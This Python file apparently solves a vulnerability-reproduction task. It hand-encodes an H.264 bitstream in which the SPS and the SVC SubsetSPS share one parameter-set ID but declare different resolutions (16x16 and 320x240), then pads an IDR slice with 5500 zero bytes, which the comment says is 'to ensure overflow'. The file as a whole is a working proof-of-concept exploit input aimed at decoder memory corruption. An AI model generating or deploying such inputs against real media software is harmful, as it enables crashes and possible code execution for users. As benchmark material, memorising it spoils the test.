import struct

class Solution:
    def solve(self, src_path: str) -> bytes:
        class BitWriter:
            def __init__(self):
                self.buffer = bytearray()
                self.accumulator = 0
                self.bit_count = 0

            def write_bit(self, bit):
                self.accumulator = (self.accumulator << 1) | (bit & 1)
                self.bit_count += 1
                if self.bit_count == 8:
                    self.buffer.append(self.accumulator)
                    self.accumulator = 0
                    self.bit_count = 0

            def write_bits(self, value, n):
                for i in range(n - 1, -1, -1):
                    self.write_bit((value >> i) & 1)

            def write_ue(self, value):
                temp = value + 1
                m = temp.bit_length() - 1
                self.write_bits(0, m)
                self.write_bits(temp, m + 1)

            def write_se(self, value):
                if value <= 0:
                    code = (-value) * 2
                else:
                    code = (value * 2) - 1
                self.write_ue(code)

            def get_bytes(self):
                if self.bit_count > 0:
                    self.accumulator <<= (8 - self.bit_count)
                    self.buffer.append(self.accumulator)
                    self.accumulator = 0
                    self.bit_count = 0
                return bytes(self.buffer)

        def rbsp_to_ebsp(data):
            out = bytearray()
            zero_count = 0
            for b in data:
                if zero_count == 2 and b <= 3:
                    out.append(0x03)
                    zero_count = 0
                out.append(b)
                if b == 0:
                    zero_count += 1
                else:
                    zero_count = 0
            return bytes(out)

        def make_nal(nal_type, payload):
            # nal_ref_idc(2)=3, nal_unit_type(5)
            header = (3 << 5) | nal_type
            return b'\x00\x00\x00\x01' + bytes([header]) + rbsp_to_ebsp(payload)

        # 1. Generate SPS (Type 7): 16x16 resolution
        # Profile 66 (Baseline), ID 0
        bw = BitWriter()
        bw.write_bits(66, 8) # profile_idc
        bw.write_bits(0, 8)  # constraint_set
        bw.write_bits(10, 8) # level_idc
        bw.write_ue(0)       # seq_parameter_set_id
        bw.write_ue(0)       # log2_max_frame_num_minus4
        bw.write_ue(0)       # pic_order_cnt_type
        bw.write_ue(0)       # log2_max_pic_order_cnt_lsb_minus4
        bw.write_ue(1)       # max_num_ref_frames
        bw.write_bit(0)      # gaps_in_frame_num_value_allowed_flag
        bw.write_ue(0)       # pic_width_in_mbs_minus1 (16px)
        bw.write_ue(0)       # pic_height_in_map_units_minus1 (16px)
        bw.write_bit(1)      # frame_mbs_only_flag
        bw.write_bit(1)      # direct_8x8_inference_flag
        bw.write_bit(0)      # frame_cropping_flag
        bw.write_bit(0)      # vui_parameters_present_flag
        bw.write_bit(1)      # rbsp_stop_one_bit
        sps_payload = bw.get_bytes()

        # 2. Generate SubsetSPS (Type 15): 320x240 resolution
        # Profile 83 (Scalable Baseline), ID 0 (overwrites/conflicts with SPS 0)
        bw = BitWriter()
        # SPS Data
        bw.write_bits(83, 8) # profile_idc
        bw.write_bits(0, 8)  # constraint_set
        bw.write_bits(10, 8) # level_idc
        bw.write_ue(0)       # seq_parameter_set_id
        
        # Profile 83 specific
        bw.write_ue(1)       # chroma_format_idc (4:2:0)
        bw.write_ue(0)       # bit_depth_luma_minus8
        bw.write_ue(0)       # bit_depth_chroma_minus8
        bw.write_bit(0)      # qpprime_y_zero_transform_bypass_flag
        bw.write_bit(0)      # seq_scaling_matrix_present_flag
        
        bw.write_ue(0)       # log2_max_frame_num_minus4
        bw.write_ue(0)       # pic_order_cnt_type
        bw.write_ue(0)       # log2_max_pic_order_cnt_lsb_minus4
        bw.write_ue(1)       # max_num_ref_frames
        bw.write_bit(0)      # gaps_in_frame_num_value_allowed_flag
        
        bw.write_ue(19)      # pic_width_in_mbs_minus1 (320px)
        bw.write_ue(14)      # pic_height_in_map_units_minus1 (240px)
        
        bw.write_bit(1)      # frame_mbs_only_flag
        bw.write_bit(1)      # direct_8x8_inference_flag
        bw.write_bit(0)      # frame_cropping_flag
        bw.write_bit(0)      # vui_parameters_present_flag
        
        # SVC Extension
        bw.write_bit(1)      # inter_layer_deblocking_filter_control_present_flag
        bw.write_bits(0, 2)  # extended_spatial_scalability_idc (0)
        bw.write_bit(0)      # seq_tcoeff_level_prediction_flag
        bw.write_bit(0)      # adaptive_tcoeff_level_prediction_flag
        bw.write_bit(0)      # slice_header_restriction_flag
        bw.write_bit(1)      # rbsp_stop_one_bit
        ssps_payload = bw.get_bytes()

        # 3. Generate PPS (Type 8)
        bw = BitWriter()
        bw.write_ue(0)       # pic_parameter_set_id
        bw.write_ue(0)       # seq_parameter_set_id
        bw.write_bit(0)      # entropy_coding_mode_flag
        bw.write_bit(0)      # bottom_field_pic_order_in_frame_present_flag
        bw.write_ue(0)       # num_slice_groups_minus1
        bw.write_ue(0)       # num_ref_idx_l0_default_active_minus1
        bw.write_ue(0)       # num_ref_idx_l1_default_active_minus1
        bw.write_bit(0)      # weighted_pred_flag
        bw.write_bits(0, 2)  # weighted_bipred_idc
        bw.write_se(0)       # pic_init_qp_minus26
        bw.write_se(0)       # pic_init_qs_minus26
        bw.write_se(0)       # chroma_qp_index_offset
        bw.write_bit(0)      # deblocking_filter_control_present_flag
        bw.write_bit(0)      # constrained_intra_pred_flag
        bw.write_bit(0)      # redundant_pic_cnt_present_flag
        bw.write_bit(1)      # rbsp_stop_one_bit
        pps_payload = bw.get_bytes()

        # 4. Generate Slice (Type 5 - IDR)
        bw = BitWriter()
        bw.write_ue(0)       # first_mb_in_slice
        bw.write_ue(7)       # slice_type (I)
        bw.write_ue(0)       # pic_parameter_set_id
        bw.write_bits(0, 4)  # frame_num
        bw.write_ue(0)       # idr_pic_id
        bw.write_bits(0, 4)  # pic_order_cnt_lsb
        bw.write_bit(0)      # no_output_of_prior_pics_flag
        bw.write_bit(0)      # long_term_reference_flag
        bw.write_se(0)       # slice_qp_delta
        bw.write_bit(1)      # rbsp_stop_one_bit
        slice_header = bw.get_bytes()

        # Assemble PoC
        poc = bytearray()
        poc.extend(make_nal(7, sps_payload))
        poc.extend(make_nal(15, ssps_payload))
        poc.extend(make_nal(8, pps_payload))
        
        # Add slice with padding to ensure overflow
        slice_data = slice_header + b'\x00' * 5500
        poc.extend(make_nal(5, slice_data))

        return bytes(poc)